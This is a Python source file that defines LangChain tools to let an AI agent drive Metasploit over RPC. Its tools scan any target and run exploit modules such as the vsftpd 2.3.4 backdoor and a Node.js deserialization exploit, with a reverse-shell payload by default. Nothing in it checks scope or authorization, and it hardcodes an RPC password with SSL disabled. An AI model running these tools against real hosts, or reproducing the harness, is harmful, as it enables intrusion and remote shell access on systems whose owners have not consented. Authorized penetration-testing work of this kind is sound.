from langchain_core.tools import tool
from pymetasploit3.msfrpc import MsfRpcClient
import time

def get_client():
    return MsfRpcClient('password', port=55553, ssl=False)

@tool
def metasploit_scan(target: str, module: str = "scanner/portscan/tcp") -> str:
    """
    Run a Metasploit auxiliary scanner against a target.
    Available modules:
    - scanner/portscan/tcp (default)
    - scanner/http/http_version
    - scanner/smb/smb_version
    Input: target IP or hostname
    """
    try:
        client = get_client()
        console = client.consoles.console()
        commands = f"use auxiliary/{module}\nset RHOSTS {target}\nset RPORT 3000\nrun\n"
        console.write(commands)
        time.sleep(15)
        result = console.read()
        console.destroy()
        return result['data'] if result['data'] else "Scan completed, no output"
    except Exception as e:
        return f"Error: {str(e)}"

@tool
def metasploit_exploit(target: str, module: str,
                       payload: str = "generic/shell_reverse_tcp") -> str:
    """
    Run a Metasploit exploit against a target.
    Example modules:
    - exploit/unix/ftp/vsftpd_234_backdoor
    - exploit/multi/http/nodejs_express_deserialize
    Input: target IP, exploit module path
    """
    try:
        client = get_client()
        console = client.consoles.console()
        commands = (f"use {module}\nset RHOSTS {target}\n"
                    f"set PAYLOAD {payload}\nrun\n")
        console.write(commands)
        time.sleep(20)
        result = console.read()
        console.destroy()
        return result['data'] if result['data'] else "Exploit completed"
    except Exception as e:
        return f"Error: {str(e)}"

@tool
def metasploit_vuln_scan(target: str) -> str:
    """
    Run comprehensive vulnerability scan using Metasploit.
    Runs multiple scanners automatically.
    Input: target IP or hostname
    """
    try:
        client = get_client()
        console = client.consoles.console()
        commands = f"""use auxiliary/scanner/portscan/tcp
set RHOSTS {target}
set RPORT 3000
run
use auxiliary/scanner/http/http_version
set RHOSTS {target}
set RPORT 3000
run
use auxiliary/scanner/http/robots_txt
set RHOSTS {target}
set RPORT 3000
run
"""
        console.write(commands)
        time.sleep(30)
        result = console.read()
        console.destroy()
        return result['data'] if result['data'] else "Scan completed"
    except Exception as e:
        return f"Error: {str(e)}"
